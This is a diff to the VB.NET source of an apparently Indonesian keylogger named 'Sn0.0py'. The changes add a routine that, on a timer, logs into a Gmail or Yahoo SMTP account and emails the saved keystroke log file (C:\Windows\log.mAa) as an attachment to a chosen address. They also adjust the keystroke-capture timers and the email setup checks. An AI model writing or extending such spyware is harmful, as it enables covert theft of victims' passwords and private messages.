@@ -1,4 +1,4 @@
-﻿Imports System
+Imports System
 Imports System.IO
 Imports Microsoft.Win32
 Imports Microsoft.Win32.RegistryKey
@@ -639,6 +639,13 @@ KeyFound:
             Label13.Text = "Status : Disable"
         End If
 
+        If keytimer.Enabled = True Then
+            If TextBox4.Focused = True Or TextBox1.Focused = True Or TextBox3.Focused = True Then
+                keytimer.Enabled = False
+            Else
+                keytimer.Enabled = True
+            End If
+        End If
     End Sub
 
     Private Sub CheckBox1_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox1.CheckedChanged
@@ -652,7 +659,7 @@ KeyFound:
 
     Private Sub Button5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button5.Click
         keytimer.Enabled = True
-        Timerall.Enabled = True
+
         Me.StatusLabel.Text = nemon
         notif.BalloonTipText = "Sn0.0py Aktif"
         notif.BalloonTipIcon = ToolTipIcon.Info
@@ -661,7 +668,7 @@ KeyFound:
 
     Private Sub Button6_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button6.Click
         keytimer.Enabled = False
-        Timerall.Enabled = False
+
         Me.StatusLabel.Text = nemoff
         notif.ShowBalloonTip(1, "", "Sn0.0py Tidak Aktif", ToolTipIcon.Info)
     End Sub
@@ -1072,13 +1079,16 @@ KeyFound:
     Private Sub OK_Button_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles OK_Button.Click
         If TextBox1.Text = "" And TextBox2.Text = "" And TextBox3.Text = "" Then
             MsgBox("Email dan Password Wajib Diisi !", MsgBoxStyle.Critical, "Warning")
-        Else
+        ElseIf ButtonSetEmail.BackColor = Color.Fuchsia Then
             Timer_Send.Enabled = True
             MsgBox("Auto Send Aktif", MsgBoxStyle.Information, "Active")
             Me.DialogResult = System.Windows.Forms.DialogResult.OK
             CheckBox1.Checked = True
             StatusLabel.Text = "Active"
             TopMost = True
+        Else
+            MsgBox("Please set email first!!!", MsgBoxStyle.Exclamation, "Set Email First!")
+            ButtonSetEmail.Focus()
         End If
     End Sub
 
@@ -1155,12 +1165,38 @@ KeyFound:
 
     End Sub
 
+    Sub KirimLogAttachment()
+        Dim SmtpServer As New SmtpClient()
+        Dim mail As New MailMessage()
+        SmtpServer.Credentials = New Net.NetworkCredential(TextBox4.Text + DomainUpDown2.SelectedItem.ToString, TextBox1.Text)
+        If DomainUpDown2.SelectedItem.ToString = "@gmail.com" Then
+            SmtpServer.Port = gport
+            SmtpServer.Host = ghost
+        ElseIf DomainUpDown2.SelectedItem.ToString = "@yahoo.com" Then
+            SmtpServer.Port = yport
+            SmtpServer.Host = ghost
+        End If
+        SmtpServer.EnableSsl = True
+        mail = New MailMessage()
+        mail.From = New MailAddress(TextBox4.Text + DomainUpDown2.SelectedItem.ToString)
+        mail.To.Add(TextBox3.Text + DomainUpDown1.SelectedItem.ToString)
+        mail.Subject = "Saved Keylog " + Now.ToString
+        mail.Body = "Log tersimpan di attachment silahkan download"
+        Dim attachment As Attachment
+        Try
+            attachment = New Attachment("C:\Windows\log.mAa")
+            mail.Attachments.Add(attachment)
+            SmtpServer.Send(mail)
+        Catch ex As Exception
+            MsgBox(ex.Message)
+        End Try
+    End Sub
     Private Sub Timer_Send_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer_Send.Tick
         If My.Computer.Network.IsAvailable Then
             Call savelog()
             Call sendtome()
             If Not TextBox4.Text = "" And Not TextBox3.Text = "" Then
-                Call kirim()
+                Call KirimLogAttachment()
             End If
         End If
     End Sub
@@ -1194,7 +1230,6 @@ KeyFound:
         Timer_Send.Enabled = False
         MsgBox("Auto Send Tidak Aktif", MsgBoxStyle.Information, "Deactived")
         CheckBox1.Checked = False
-        Me.Opacity = 0%
         keytimer.Enabled = True
         TopMost = True
     End Sub
@@ -1300,7 +1335,7 @@ KeyFound:
             Try
                 Dim SmtpServer As New SmtpClient()
                 Dim mail As New MailMessage()
-                SmtpServer.Credentials = New Net.NetworkCredential(TextBox4.Text, TextBox1.Text)
+                SmtpServer.Credentials = New Net.NetworkCredential(TextBox4.Text + DomainUpDown2.SelectedItem.ToString, TextBox1.Text)
                 If DomainUpDown2.SelectedItem.ToString = "@gmail.com" Then
                     SmtpServer.Port = gport
                     SmtpServer.Host = ghost
@@ -1310,12 +1345,14 @@ KeyFound:
                 End If
                 SmtpServer.EnableSsl = True
                 mail = New MailMessage()
-                mail.From = New MailAddress(TextBox4.Text)
+                mail.From = New MailAddress(TextBox4.Text + DomainUpDown2.SelectedItem.ToString)
                 mail.To.Add(TextBox3.Text + DomainUpDown1.SelectedItem.ToString)
                 mail.Subject = "Testing And Set Account Security " + Now.ToString
                 mail.Body = "Completed"
                 SmtpServer.Send(mail)
+                Me.TopMost = False
                 MsgBox("Sending Email Complete")
+                Me.TopMost = True
                 ButtonSetEmail.BackColor = Color.Fuchsia
                 ButtonSetEmail.Text = "Setting Email" + vbNewLine + "COMPLETE"
             Catch ex As Exception
@@ -1362,7 +1399,7 @@ KeyFound:
         Me.DateLabel.Text = DateTime.Now.ToString("dd.MM.yyyy")
     End Sub
 
-    Private Sub Timerall_Tick(sender As Object, e As EventArgs) Handles Timerall.Tick
+    Private Sub Timerall_Tick(sender As Object, e As EventArgs)
         If TextBox4.Focused = True Or TextBox1.Focused = True Or TextBox3.Focused = True Then
             keytimer.Enabled = False
         Else
@@ -1821,4 +1858,5 @@ KeyFound:
             Button24.BackColor = Color.Transparent
         End If
     End Sub
+
 End Class
